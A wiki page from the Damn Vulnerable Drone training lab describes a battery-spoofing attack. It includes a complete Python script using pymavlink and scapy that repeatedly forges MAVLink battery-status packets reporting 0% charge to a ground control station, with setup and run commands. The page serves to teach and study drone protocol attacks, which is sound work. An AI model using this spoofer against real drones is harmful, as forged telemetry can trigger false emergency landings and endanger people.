<i>Spoofing the drone's battery status to mislead the Ground Control Station (GCS) into thinking the battery is critically low or dead.</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Protocol Tampering > Battery Spoofing

# Description

Battery spoofing involves sending false battery status data to the Ground Control Station (GCS) to mislead it about the drone's actual battery status. This can cause the operator to think the drone's battery is critically low or dead, potentially triggering emergency landing protocols or other safety measures.

# Resources

- <a href="https://mavlink.io/en/">MAVLink Protocol</a>  
- <a href="https://mavlink.io/en/mavgen_python/">PyMAVLink Documentation</a>

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

<h3>Step 1. Setup</h3>
<p>Install the required dependencies:</p>

<pre><code class="code mb-3 mt-3">sudo apt-get update
sudo apt-get install python3 python3-pip
pip3 install pymavlink scapy
</code></pre>

---

<h3>Step 2. Create the Script</h3>
<p>Save the following code as <code>battery-spoof.py</code>:</p>

<pre><code class="code mb-3 mt-3">from pymavlink import mavutil
from scapy.all import *
import time
import sys

def create_battery_status():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1

    return mav.battery_status_encode(
        id=0,
        battery_function=mavutil.mavlink.MAV_BATTERY_FUNCTION_ALL,
        type=mavutil.mavlink.MAV_BATTERY_TYPE_LIPO,
        temperature=300,
        voltages=[3000, 3000, 3000, 0, 0, 0, 0, 0, 0, 0],
        current_battery=-1,
        current_consumed=5000,
        energy_consumed=10000,
        battery_remaining=0
    ).pack(mav)

def send_mavlink_packet(packet_data, target_ip, target_port):
    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
    send(packet)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python battery-spoof.py &lt;ip:port&gt;")
        sys.exit(1)

    target_ip, target_port = sys.argv[1].split(':')
    target_port = int(target_port)

    while True:
        packet = create_battery_status()
        send_mavlink_packet(packet, target_ip, target_port)
        print(f"Sent battery status packet to {target_ip}:{target_port}")
</code></pre>

---

<h3>Step 3. Run the Script</h3>
<p>Execute the script with the appropriate target IP and port:</p>

<pre><code class="code mb-3 mt-3">sudo python3 battery-spoof.py 10.13.0.6:14550</code></pre>

<p>Replace <code>10.13.0.6:14550</code> with the actual GCS IP and port, such as:</p>
<ul>
  <li><code>192.168.13.14:14550</code> (WiFi GCS)</li>
  <li><code>10.13.0.4:14550</code> (Bridge mode GCS)</li>
</ul>

---

<h3>Step 4. Monitor the Effects</h3>
<p>Observe the GCS interface for spoofed battery values. The drone will appear to have 0% battery and may trigger low battery failsafes such as Return-to-Launch (RTL) or emergency landing.</p>

</details>
